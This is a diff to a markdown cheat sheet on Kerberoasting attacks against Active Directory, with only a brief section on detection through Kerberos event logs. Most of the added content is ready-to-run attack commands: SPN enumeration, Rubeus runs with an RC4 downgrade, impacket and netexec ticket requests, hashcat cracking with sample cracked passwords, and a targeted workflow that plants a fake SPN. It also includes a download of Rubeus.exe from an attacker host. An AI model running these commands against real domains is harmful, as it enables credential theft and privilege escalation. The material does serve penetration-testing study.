@@ -52,9 +52,27 @@ A **Kerberoast attack** is a lateral movement and privilege escalation technique
     - **Monitor TGS Requests:** Look for an unusually high number of Kerberos TGS-REQ and TGS-REP requests, which can indicate automated Kerberoasting tools at work.
     - **Event Logging:** Configure Domain Controllers to log Kerberos TGS ticket operations by enabling "Audit Kerberos Service Ticket Operations" in Group Policy. Monitor for Event IDs **4769 (a Kerberos service ticket was requested)** and **4770 (a Kerberos service ticket was renewed)**. A large volume of Event ID 4769 from a single account within a short period is a strong indicator of an attack.
     - **Identify Encryption Type:** When monitoring logs, note the encryption type used in ticket requests (e.g., `0x17` for RC4), as this indicates a weaker encryption that could be more easily cracked.
+
+---
+
+## Enumeration — Find Kerberoastable Accounts
+
+**PowerView (Windows)**
+```powershell
+# List all accounts with SPNs
+Get-DomainUser -SPN | select samaccountname, serviceprincipalname
+
+# Filter for high-value targets (admincount=1)
+Get-DomainUser -SPN -AdminCount | select samaccountname, serviceprincipalname
+```
+
+**BloodHound** — run the built-in query: *"List all Kerberoastable Accounts"* — then filter for those with a path to DA.
+
+---
+
 ## Rubeus
 Machine location
-```
+```shell
 ┌──(kali㉿kali)-[~/tools/Ghostpack-CompiledBinaries]
 └─$ pwd                      
 /home/kali/tools/Ghostpack-CompiledBinaries
@@ -81,13 +99,27 @@ drwxrwxr-x 2 kali kali 4.0K Sep 23 17:45 'dotnet v4.7.2 compiled binaries'
 -rw-rw-r-- 1 kali kali  53K Sep 23 17:45  SharpWMI.exe
 ```
 
-Run it 
-Utilizing Rubeus to perform a Kerberoast attack
-```
+Run it — standard kerberoast
+```powershell
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
+Target only high-value accounts (`admincount=1`)
+```powershell
+.\Rubeus.exe kerberoast /admincount /outfile:hashes.kerberoast
 ```
+
+Force RC4 downgrade (useful when account supports AES — works best on DC <= Server 2016)
+```powershell
+.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.kerberoast
+```
+
+Target a specific user
+```powershell
+.\Rubeus.exe kerberoast /user:iis_service /outfile:hashes.kerberoast
+```
+
+```powershell
 PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 
    ______        _
@@ -120,40 +152,31 @@ PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
 
-```
+```powershell
 iwr -uri http://192.168.45.175/Rubeus.exe -Outfile Rubeus.exe
 ```
 
+---
 
-Reviewing the correct Hashcat mode
-```
-kali@kali:~$ cat hashes.kerberoast
-$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
-...
-
-kali@kali:~$ hashcat --help | grep -i "Kerberos"         
-  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
-  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
-  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
-  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
-   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
-  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
-  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
-```
-
-Cracking the TGS-REP hash
-```
-kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-...
-
-$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
-...
-d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
-...
-```
+## Impacket — Linux
 
 Using impacket-GetUserSPNs to perform Kerberoasting on Linux
+```shell
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
+
+With password written to file (avoids interactive prompt)
+```shell
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete -outputfile hashes.kerberoast
+```
+
+Using NTLM hash instead of cleartext password (useful post-pass-the-hash)
+```shell
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete -hashes :NTLMhashhere -outputfile hashes.kerberoast
+```
+
+Example output
+```shell
 kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -167,12 +190,93 @@ HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <neve
 $krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
 ```
 
-Cracking the TGS-REP hash
-```
-kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-...
+---
 
-$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec
-...
-a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e334a2856c009bc76e4e24372c4db4d7f41a8be56e1b6a912c44dd259052299bac30de6a8d64f179caaa2b7ee87d5612cd5a4bb9f050ba565aa97941ccfd634b:Strawberry1
+## netexec (nxc)
+
+Quick one-liner from Linux — no Rubeus or impacket setup needed
+```shell
+nxc ldap <dc-ip> -u user -p 'password' --kerberoasting hashes.kerberoast
+```
+
+With NTLM hash
+```shell
+nxc ldap <dc-ip> -u user -H :NTLMhashhere --kerberoasting hashes.kerberoast
+```
+
+---
+
+## Cracking
+
+**Hash type reference**
+
+| Hash prefix    | etype             | Hashcat mode | Notes                                  |
+| -------------- | ----------------- | ------------ | -------------------------------------- |
+| `$krb5tgs$23$` | RC4 (type 23)     | `13100`      | Fast to crack, default for older DCs   |
+| `$krb5tgs$18$` | AES-256 (type 18) | `19700`      | Slow — force RC4 downgrade if possible |
+| `$krb5tgs$17$` | AES-128 (type 17) | `19600`      | Slow — force RC4 downgrade if possible |
+
+If you get AES hashes, try RC4 downgrade via Rubeus `/tgtdeleg` or impacket `-k` before spending time cracking.
+
+Reviewing the correct Hashcat mode
+```shell
+kali@kali:~$ hashcat --help | grep -i "Kerberos"         
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+```
+
+Cracking RC4 TGS-REP hash
+```shell
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+Cracking AES-256 TGS-REP hash
+```shell
+sudo hashcat -m 19700 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+Example cracked output
+```shell
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$...
+...a96a7e6e29aa173b401935f8f3a476cdbcca8f132e6cc8349dcc88fcd26854e:Strawberry1
+```
+
+---
+
+## Targeted Kerberoasting Workflow
+
+Use when you have `GenericWrite` / `GenericAll` / `WriteProperty` over a user that does **not** already have an SPN.
+
+**Step 1 — Verify the user has no SPN**
+```powershell
+Get-DomainUser targetuser | select samaccountname, serviceprincipalname
+```
+
+**Step 2 — Set a fake SPN**
+```powershell
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/BLAH'}
+```
+
+**Step 3 — Request the TGS ticket**
+```powershell
+# With Rubeus
+.\Rubeus.exe kerberoast /user:targetuser /outfile:targeted.kerberoast
+
+# Or with impacket from Linux
+sudo impacket-GetUserSPNs -request -dc-ip <dc-ip> corp.com/attacker -outputfile targeted.kerberoast
+```
+
+**Step 4 — Remove the fake SPN (clean up)**
+```powershell
+Set-DomainObject -Identity targetuser -Clear serviceprincipalname
+```
+
+**Step 5 — Crack the hash**
+```
+sudo hashcat -m 13100 targeted.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
